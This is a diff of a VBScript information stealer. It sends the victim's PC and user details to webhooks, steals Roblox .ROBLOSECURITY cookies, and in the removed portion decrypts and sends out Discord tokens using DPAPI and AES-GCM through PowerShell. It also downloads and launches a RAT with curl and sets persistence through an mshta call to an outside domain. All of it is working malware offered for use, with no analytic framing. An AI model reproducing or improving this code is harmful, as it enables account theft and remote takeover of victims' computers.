@@ -21,18 +21,20 @@ lastCookie = ""
 ' --- 1. INITIAL (all to WH) ---
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
 Call IP(WH)
-Call GrabTokensNative(WH)
+Call GrabTokens(WH)
 Call Persistence
 Call PostCookieOnly(WH)
+
+' --- 2. DROP RAT LAST (init) ---
 Call DropRAT(WH)
 
-' --- 2. LOOP (all to RE_WH) ---
+' --- 3. LOOP (all to RE_WH) ---
 Dim runCount
 runCount = 0
 Do
     runCount = runCount + 1
     Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, RE_WH)
-    Call GrabTokensNative(RE_WH)
+    Call GrabTokens(RE_WH)
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
     If Not ratDropped Then Call DropRAT(RE_WH)
@@ -40,125 +42,6 @@ Do
 Loop
 
 window.close()
-
-' --- NATIVE TOKEN GRABBER (No PS1 needed for Discord) ---
-Sub GrabTokensNative(targetWH)
-    Dim appdata, paths, i, filePath, raw, mk, startPos, endPos, b64, token, lines, l
-    appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
-    
-    ' Get Master Key
-    Dim lsPath : lsPath = appdata & "\discord\Local State"
-    If fso.FileExists(lsPath) Then
-        raw = ReadFile(lsPath)
-        startPos = InStr(raw, """encrypted_key"":""") + 17
-        If startPos > 17 Then
-            endPos = InStr(startPos, raw, """")
-            b64 = Mid(raw, startPos, endPos - startPos)
-            mk = DecryptDPAPI(b64)
-            ' Strip the DPAPI prefix (5 bytes, usually "DPAPI")
-            If Len(mk) > 5 Then mk = Mid(mk, 6)
-        End If
-    End If
-
-    If Len(mk) > 0 Then
-        paths = Array(appdata & "\discord\Local Storage\leveldb", appdata & "\discordptb\Local Storage\leveldb", appdata & "\discordcanary\Local Storage\leveldb")
-        For i = 0 To UBound(paths)
-            If fso.FolderExists(paths(i)) Then
-                Dim folder, f
-                Set folder = fso.GetFolder(paths(i))
-                For Each f In folder.Files
-                    If Right(f.Name, 4) = ".ldb" Or Right(f.Name, 4) = ".log" Then
-                        raw = ReadFile(f.Path)
-                        startPos = 1
-                        Do
-                            startPos = InStr(startPos, raw, "dQw4w9WgXcQ:")
-                            If startPos = 0 Then Exit Do
-                            startPos = startPos + 12
-                            endPos = startPos
-                            Do
-                                Dim char : char = Mid(raw, endPos, 1)
-                                If char = """" Or char = "\" Or Asc(char) < 32 Then Exit Do
-                                endPos = endPos + 1
-                                If endPos - startPos > 200 Then Exit Do
-                            Loop
-                            b64 = Mid(raw, startPos, endPos - startPos)
-                            If Len(b64) > 40 Then
-                                token = DecryptGCM(mk, b64)
-                                If Len(token) > 30 Then Call PostEmbedTo(":gift: Discord Token", "**Token:** " & token, 10181046, targetWH)
-                            End If
-                        Loop
-                    End If
-                Next
-            End If
-        Next
-    End If
-End Sub
-
-' --- NATIVE ROBLOX COOKIE ---
-Sub PostCookieOnly(targetWH)
-    Dim cookie : cookie = GetRobloxCookie()
-    If Len(cookie) < 20 Then Exit Sub
-    If cookie = lastCookie Then Exit Sub
-    lastCookie = cookie
-    Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
-End Sub
-
-Function GetRobloxCookie()
-    GetRobloxCookie = ""
-    Dim l, appdata, paths, i, fp, raw, startPos, endPos, b64
-    l = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
-    appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
-    
-    Dim checkPaths(4)
-    checkPaths(0) = l & "\Roblox\LocalStorage\robloxcookies.dat"
-    checkPaths(1) = l & "\Roblox\LocalStorage\RobloxCookies.dat"
-    checkPaths(2) = appdata & "\Roblox\LocalStorage\robloxcookies.dat"
-    checkPaths(3) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
-    checkPaths(4) = l & "\RobloxPCGDK\LocalStorage\RobloxCookies.dat"
-    
-    For i = 0 To 4
-        If fso.FileExists(checkPaths(i)) Then fp = checkPaths(i) : Exit For
-    Next
-    
-    If Len(fp) = 0 Then
-        Dim pk: pk = l & "\Packages"
-        If fso.FolderExists(pk) Then
-            Dim folder, subf
-            Set folder = fso.GetFolder(pk)
-            For Each subf In folder.SubFolders
-                If InStr(UCase(subf.Name), "ROBLOX") > 0 Then
-                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
-                    If fso.FileExists(uwp) Then fp = uwp : Exit For
-                End If
-            Next
-        End If
-    End If
-    
-    If Len(fp) = 0 Then Exit Function
-    raw = ReadFile(fp)
-    
-    If InStr(raw, "CookiesData"":""") > 0 Then
-        startPos = InStr(raw, "CookiesData"":""") + 14
-        endPos = InStr(startPos, raw, """")
-        b64 = Mid(raw, startPos, endPos - startPos)
-        GetRobloxCookie = DecryptDPAPI(b64)
-    ElseIf InStr(raw, ".ROBLOSECURITY") > 0 Then
-        startPos = InStr(raw, ".ROBLOSECURITY")
-        GetRobloxCookie = Mid(raw, startPos, 2000)
-    ElseIf InStr(raw, "_|WARNING") > 0 Then
-        startPos = InStr(raw, "_|WARNING")
-        GetRobloxCookie = Mid(raw, startPos, 2000)
-    Else
-        GetRobloxCookie = raw
-    End If
-    
-    GetRobloxCookie = Replace(GetRobloxCookie, vbCr, "")
-    GetRobloxCookie = Replace(GetRobloxCookie, vbLf, "")
-    GetRobloxCookie = Replace(GetRobloxCookie, vbTab, "")
-    GetRobloxCookie = Trim(GetRobloxCookie)
-    Dim sc : sc = InStr(GetRobloxCookie, ";")
-    If sc > 0 Then GetRobloxCookie = Left(GetRobloxCookie, sc - 1)
-End Function
 
 ' --- RAT DROP ---
 Sub DropRAT(targetWH)
@@ -171,6 +54,7 @@ Sub DropRAT(targetWH)
     If fso.FileExists(op) Then fso.DeleteFile op, True
 
     Call PostEmbedTo(":rocket: RAT Download", "Starting download...", 10181046, targetWH)
+    
     Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"" -o """ & op & """ """ & dl & """"
     sh.Run dlCmd, 0, True
 
@@ -184,10 +68,10 @@ Sub DropRAT(targetWH)
             Call SleepSeconds(2)
             Call PostEmbedTo(":white_check_mark: RAT Launched", "Payload executed.", 10181046, targetWH)
         Else
-            Call PostEmbedTo(":x: RAT Download", "File too small: " & fSize & " bytes (link expired?)", 16711680, targetWH)
+            Call PostEmbedTo(":x: RAT Download", "File too small: " & fSize & " bytes", 16711680, targetWH)
         End If
     Else
-        Call PostEmbedTo(":x: RAT Download", "Download failed (link expired?)", 16711680, targetWH)
+        Call PostEmbedTo(":x: RAT Download", "Download failed (link expired)", 16711680, targetWH)
     End If
 End Sub
 
@@ -218,6 +102,82 @@ Sub IP(targetWH)
     Set xh = Nothing
 End Sub
 
+Sub PostCookieOnly(targetWH)
+    Dim cookie : cookie = GetRobloxCookie()
+    If Len(cookie) < 20 Then Exit Sub
+    If cookie = lastCookie Then Exit Sub
+    lastCookie = cookie
+    Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
+End Sub
+
+Function GetRobloxCookie()
+    GetRobloxCookie = ""
+    Dim paths(4)
+    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
+    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
+    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+    Dim i, fp, raw
+    For i = 0 To 4
+        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
+    Next
+    If Len(fp) = 0 Then
+        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
+        If fso.FolderExists(pk) Then
+            Dim folder, subf
+            Set folder = fso.GetFolder(pk)
+            For Each subf In folder.SubFolders
+                If InStr(UCase(subf.Name), "ROBLOX") > 0 Then
+                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
+                    If fso.FileExists(uwp) Then fp = uwp : Exit For
+                End If
+            Next
+            Set folder = Nothing
+        End If
+    End If
+    If Len(fp) = 0 Then Exit Function
+    raw = ReadFile(fp)
+    If Len(raw) < 20 Then Exit Function
+
+    Dim cookie: cookie = ""
+    Dim sp: sp = InStr(raw, "CookiesData"":""")
+    If sp > 0 Then
+        sp = sp + 14
+        Dim ep: ep = InStr(sp, raw, """")
+        If ep > sp Then
+            Dim b64: b64 = Mid(raw, sp, ep - sp)
+            If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
+        End If
+    End If
+    If Len(cookie) < 20 And InStr(raw, ".ROBLOSECURITY") > 0 Then
+        Dim rp: rp = InStr(raw, ".ROBLOSECURITY") + 15
+        Dim seg: seg = Mid(raw, rp, 2000)
+        seg = Replace(seg, vbCr, "") : seg = Replace(seg, vbLf, "") : seg = Replace(seg, vbTab, "")
+        Dim sc1: sc1 = InStr(seg, ";")
+        If sc1 > 0 Then seg = Left(seg, sc1 - 1)
+        cookie = Trim(seg)
+    End If
+    If Len(cookie) < 20 And InStr(raw, "_|WARNING") > 0 Then
+        Dim wp: wp = InStr(raw, "_|WARNING")
+        Dim seg2: seg2 = Mid(raw, wp, 2000)
+        seg2 = Replace(seg2, vbCr, "") : seg2 = Replace(seg2, vbLf, "") : seg2 = Replace(seg2, vbTab, "")
+        Dim sc2: sc2 = InStr(seg2, ";")
+        If sc2 > 0 Then seg2 = Left(seg2, sc2 - 1)
+        cookie = Trim(seg2)
+    End If
+    If Len(cookie) < 20 Then
+        Dim cleaned: cleaned = raw
+        cleaned = Replace(cleaned, vbCr, "") : cleaned = Replace(cleaned, vbLf, "") : cleaned = Replace(cleaned, vbTab, "")
+        cleaned = Trim(cleaned)
+        Dim eqp: eqp = InStr(cleaned, "=")
+        If eqp > 0 And eqp < 40 Then cleaned = Mid(cleaned, eqp + 1)
+        If Len(cleaned) >= 40 Then cookie = cleaned
+    End If
+    cookie = Trim(cookie)
+    GetRobloxCookie = cookie
+End Function
+
 Sub Persistence()
     Dim payload : payload = "mshta https://dicerigx.app/"
     On Error Resume Next
@@ -235,7 +195,6 @@ Sub SleepSeconds(s)
     sh.Run cmd, 0, True
 End Sub
 
-' --- HELPERS ---
 Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
 Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
 
@@ -249,7 +208,21 @@ Function ReadFile(path)
     Set f = Nothing
 End Function
 
-' Native DPAPI decrypt via PowerShell (executes and reads immediately)
+Sub PostEmbed(t, d, c)
+    Call PostEmbedTo(t, d, c, WH)
+End Sub
+
+Sub PostEmbedTo(t, d, c, target_wh)
+    Dim DQ: DQ = Chr(34)
+    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "POST", target_wh, False
+    h.SetRequestHeader "Content-Type", "application/json"
+    h.Send j
+    Set h = Nothing
+End Sub
+
 Function DecryptDPAPI(b64)
     DecryptDPAPI = ""
     Dim inf: inf = TmpFile("dpi.txt")
@@ -267,51 +240,6 @@ Function DecryptDPAPI(b64)
     fso.DeleteFile outf, True
     On Error GoTo 0
 End Function
-
-' Native GCM decrypt for Discord tokens
-Function DecryptGCM(key, b64)
-    DecryptGCM = ""
-    Dim inf: inf = TmpFile("gcm.txt")
-    Dim outf: outf = TmpFile("gcm_out.txt")
-    On Error Resume Next
-    fso.DeleteFile outf, True
-    WriteFile inf, b64
-    Dim ps: ps = "try{$k=[Convert]::FromBase64String('" & Base64Encode(key) & "');$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$n=$b[3..14];$c=$b[15..($b.Length-17)];$aes=[System.Security.Cryptography.Aes]::Create();$aes.Key=$k;$aes.Mode='ECB';$aes.Padding='None';$e=$aes.CreateEncryptor();$o=New-Object byte[] $c.Length;$cb=New-Object byte[] 16;$n.CopyTo($cb,0);$cb[15]=2;for($i=0;$i -lt $c.Length;$i+=16){$kk=$e.TransformFinalBlock($cb,0,16);for($j=0;$j -lt [Math]::Min(16,$c.Length-$i);$j++){$o[$i+$j]=$c[$i+$j] -bxor $kk[$j]};for($j=15;$j -ge 12;$j--){$cb[$j]++;if($cb[$j] -ne 0){break}}};[Text.Encoding]::UTF8.GetString($o)|Out-File '" & outf & "' -Encoding ascii}catch{}"
-    Dim psf: psf = TmpFile("gcm.ps1")
-    WriteFile psf, ps
-    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
-    If fso.FileExists(outf) Then DecryptGCM = ReadFile(outf)
-    fso.DeleteFile inf, True
-    fso.DeleteFile psf, True
-    fso.DeleteFile outf, True
-    On Error GoTo 0
-End Function
-
-Function Base64Encode(str)
-    Dim xml, node
-    Set xml = CreateObject("MSXML2.DOMDocument")
-    Set node = xml.createElement("b64")
-    node.dataType = "bin.base64"
-    node.nodeTypedValue = str
-    Base64Encode = node.text
-    Set node = Nothing
-    Set xml = Nothing
-End Function
-
-Sub PostEmbed(t, d, c)
-    Call PostEmbedTo(t, d, c, WH)
-End Sub
-
-Sub PostEmbedTo(t, d, c, target_wh)
-    Dim DQ: DQ = Chr(34)
-    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
-    h.Open "POST", target_wh, False
-    h.SetRequestHeader "Content-Type", "application/json"
-    h.Send j
-    Set h = Nothing
-End Sub
 
 Function Ej(s)
     Ej = s
